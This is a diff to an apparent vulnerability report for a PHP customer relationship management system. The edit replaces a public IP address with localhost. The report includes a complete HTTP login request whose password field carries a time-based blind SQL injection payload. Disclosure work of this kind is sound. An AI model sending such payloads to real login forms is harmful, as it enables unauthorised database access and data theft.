@@ -1,6 +1,6 @@
 CMS source code url: https://www.sourcecodester.com/php/15895/simple-customer-relationship-management-crm-system-using-php-free-source-coude.html
 
-URL: http://127.0.0.1/php-scrm/admin/ \
+URL: http://127.0.0.1/php-scrm/login/ \
 Perameter: password
 
 Attack Details: \
@@ -20,13 +20,13 @@ HTTP Request:
 POST /php-scrm/login.php HTTP/1.1
 Content-Type: application/x-www-form-urlencoded
 X-Requested-With: XMLHttpRequest
-Referer: http://192.144.217.51/php-scrm/
+Referer: http://127.0.0.1/php-scrm/
 Cookie: PHPSESSID=7es0mk87rhg4ue4vq93d1316df
 Content-Length: 90
 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
 Accept-Encoding: gzip,deflate,br
 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36
-Host: 192.144.217.51
+Host: 127.0.0.1
 Connection: Keep-alive
 
 email=testing%40example.com&login=&password=0'XOR(if(now()=sysdate()%2Csleep(6)%2C0))XOR'Z
